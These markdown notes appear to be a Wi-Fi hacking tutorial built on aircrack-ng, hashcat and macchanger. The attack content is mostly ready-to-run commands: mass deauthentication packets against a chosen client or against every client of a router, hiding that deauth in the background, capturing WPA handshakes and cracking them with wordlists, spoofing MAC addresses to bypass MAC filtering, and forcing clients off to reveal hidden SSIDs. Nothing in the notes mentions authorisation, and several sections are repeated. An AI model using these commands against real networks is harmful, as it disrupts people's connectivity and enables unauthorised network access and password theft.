## Step1. 
- connect WiFi-Adapter
- use `iwconfig` and check it's connected or not.

## Step2.

### 1. Start monitor mode
```bash
airmon-ng start wlan0
```

### 2. Discover networks
```bash
airodump-ng wlan0
```

If you want to scan both 2.4 GHz and 5 GHz:

   ```bash
   airodump-ng --band ab wlan0mon
   ```

### 3. Target the right BSSID/CH
```bash
airodump-ng -c [channel] --bssid [target BSSID] -w capture wlan0
```

### 4. Force a client to reconnect (capture handshake)
```bash
aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0
```
- 10000 is the number of deauth packets
- working : it's send packets like i want to disconnect form this wifi. and here mac address is client address

### If you want to do it in the background
```
 aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0 &> /dev/null & 
```
- &> /dev/null use to hide the output
- Lat & for run multiple commands
- Use jobs to see commands running in the background.
- Use the kill command to stop a specific command.Like `kill %1` OR for all `killall aireplay-ng`


### 5. Crack the handshake
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture.cap
```

### 6. Crack the hashes.
---
#### 🔁 Step 1: Convert `.cap` to `.hc22000`

Use `hcxpcapngtool` to convert your `.cap` or `.hccapx` to `.hc22000`:

```bash
hcxpcapngtool -o file_name.hc22000 file_name.cap
```

### 🚀 Step 2: Crack with Hashcat in Correct Mode

```bash
hashcat -m 22000 file_name.hc22000 /path/to/wifi/password/wordlist
```

* `-m 22000`: The correct WPA2/WPA3 handshake mode.
* `file_name.hc22000`: Your converted handshake.
* Wordlist path: That big juicy file you’ve got.


### 🧠 Harpy Pro Tip:

Wanna see **live cracking stats**?
Add:

```bash
--status --status-timer=10
```

To pause/resume:

* Press `p` to pause
* Press `r` to resume

---

### ✅ Example Full Command:

```bash
hashcat -m 22000 handshake.hc22000 /path/to/wifi/password/wordlist --status --status-timer=10
```

## Preconnection Attacks
- More advanced pre-connection attacks
- manually change MAC address on any supported divice.
- Target 5Ghz Networks and clients.
- Deauthenticate multiple clients simultaneously.
- Run deauth attack against multiple networks simultaneously.

### MAC spoofing

commands:
```bash
ifconfig wlan0 down 
macchanger -r wlan0 # auto change mac address
#or
ifconfig wlan0 hw ether 00:11:22:33:44:55 # manully change mac address
ifconfig wlan0 up
```
- `macchanger -r wlan0`:- auto change mac address
- `ifconfig wlan0 hw ether 00:11:22:33:44:55` :- manully change mac address

### Wifi Bands
- Decides the frequency range that can be used.
- Determines the channels that can be used.
- Clients need to support band used by router to communicate with it.
- Data can be sniffed from a certain band if the wireless adapter used
supports that band.
- Most common WiFi Bands are:
    - a uses 5 Ghz frequency only.
    - b, g both use 2.4 Ghz frequency only.
    - n uses 5 and 2.4 Ghz.
    - ac uses frequencies lower than 6 Ghz

The command:
```bash
airodump-ng --band a wlan0
```

### 🔍 What it does:

* **`airodump-ng`**: A tool used to capture raw 802.11 wireless frames. It’s part of the Aircrack-ng suite.
* **`--band a`**: This tells `airodump-ng` to scan **only the 5 GHz band** (802.11a).
* **`wlan0`**: This is your wireless interface. It must be in **monitor mode** (e.g., `wlan0mon` on most systems).
* Scan for **5 GHz networks** only (ignores 2.4 GHz).
* Identify **access points (APs)**, clients, BSSIDs, channels, etc. operating in the 5 GHz band.

---

### 🧠 Important Notes:

1. Your Wi-Fi card **must support 5 GHz** to use `--band a`.
2. Your interface **must be in monitor mode**:

   ```bash
   airmon-ng start wlan0
   # Then use wlan0mon (or check with `iwconfig`)
   ```
3. If you want to scan both 2.4 GHz and 5 GHz:

   ```bash
   airodump-ng --band ab wlan0mon
   ```

---
## 🔍 Step 3: Target the Correct BSSID and Channel

Use `airodump-ng` to lock in on a specific wireless network and begin packet capture:

```bash
airodump-ng -c [channel] --bssid [target BSSID] -w capture wlan0
```

* `-c [channel]` – Specifies the Wi-Fi channel to listen on.
* `--bssid [target BSSID]` – Targets a specific access point (AP).
* `-w capture` – Saves the captured packets to a file (`capture.cap`).
* `wlan0` – Replace with your wireless interface in monitor mode.

---

## ⚔️ Step 4: Capture the Handshake via Client Deauthentication

Trigger deauthentication packets to force a client to reconnect, thereby capturing the WPA/WPA2 handshake:

```bash
aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0
```

* `--deauth 10000` – Sends 10,000 deauth packets.
* `-a [router BSSID]` – Specifies the AP’s MAC address.
* `-c [client MAC]` – Targets the client (station) MAC address.
* `wlan0` – Again, replace with your actual wireless interface.

🧠 *This simulates disconnection requests, tricking the client into reconnecting, which exposes the handshake.*

---

## ⚔️ Disconnect All Devices from a Targeted Router

### Basic deauth for all clients:

```bash
aireplay-ng --deauth 10000 -a [router BSSID] wlan0
```

* `--deauth 10000` – Number of deauth packets (adjust as needed).
* `-a [router BSSID]` – Targets the access point.
* No `-c` flag = affects **all connected clients**.
* `wlan0` – Your monitor-mode interface.

---

## 👻 Run Deauth in Background (Silent Mode)

To run the attack silently and in the background:

```bash
aireplay-ng --deauth 10000 -a [router BSSID] -c [client MAC] wlan0 &> /dev/null &
```

* `&> /dev/null` – Suppresses all output (stdout and stderr).
* `&` – Runs the command in the background.

![alt text](images/multi%20commands.png)

### 🔍 Monitor Background Jobs

To view running background tasks:

```bash
jobs
```

### ❌ Kill Background Processes

To stop a specific background job:

```bash
kill %1
```

To terminate all running `aireplay-ng` processes:

```bash
killall aireplay-ng
```

---

🦅 *Stay sharp: Monitor your capture file to ensure the handshake is obtained. Use `aircrack-ng -r` or `wireshark` for verification.*

## Gaining Access
- target hidden networks
- Bypass mac filtering
- method to gain access to
- Advanced method to gain access to
    - Captive portals.
    - WEP.
    - WPA
    - wpA2.
    - WPA/WPA2 Enterprise.
- Manually create fake AP.

### Hidden networks
- A hidden network is one that does not broadcast its name or ESSID.
-  Hidden networks still broadcasts their existance (channel, BSSID).

#### Problem:
- Can’t connect or even attempt to crack its password.
#### Solutions:
- Airodump-ng can determine the ESSID if the network is active.
- Deauth one of the connected clients for a short period of time.
![alt text](images/Hidden%20network1.png)
![alt text](images/Hidden%20network2.png)
![alt text](images/Hidden%20network3.png)

---

### 🛠️ Objective:

**Reveal the SSID of a hidden Wi-Fi network** by forcing a connected client to disconnect (deauth attack), and then capturing the handshake or beacon when it reconnects.

---

###  Explanation:

To identify the name (SSID) of a hidden Wi-Fi network:

1. Use `airodump-ng` to find the **BSSID** of the hidden network and any **connected clients**.
2. Use `aireplay-ng` to send **deauthentication packets** to disconnect a client from that network.
3. When the client **reconnects**, it sends a probe request or association request **revealing the SSID**, which you can capture with `airodump-ng`.

---

### ✅ Command:

```bash
aireplay-ng --deauth 4 -a [Router_BSSID] -c [Client_MAC] wlan0
```

* `--deauth 4`: sends 4 deauth packets (you can increase it if needed).
* `-a [Router_BSSID]`: the MAC address of the hidden Wi-Fi router (AP).
* `-c [Client_MAC]`: the MAC address of a client connected to the hidden Wi-Fi.
* `wlan0`: your wireless interface in monitor mode.

---

### 🧠 Full Flow Example:

```bash
# Step 1: Scan and find hidden AP and client
airodump-ng wlan0mon

# Step 2: Deauth the client
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 3: Capture packets and reveal SSID when client reconnects
airodump-ng -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

Once the client reconnects, the hidden SSID will appear in `airodump-ng`, or can be extracted from the capture file using `Wireshark`.

---

### Mac Filtering
- Mac address is unique to each network device.
- Routers can use mac filtering to allow/deny devices from connecting based on their mac address.

#### 2 Implementations:
1. Using a blacklist - allow all MACs to connect except the ones in the list.
   - Ans:- Just change the MAC address.
2. Using a whitelist - deny all MACs from connecting except the ones in the list.
   - Ans:- Just change the MAC address to connected device MAC address.


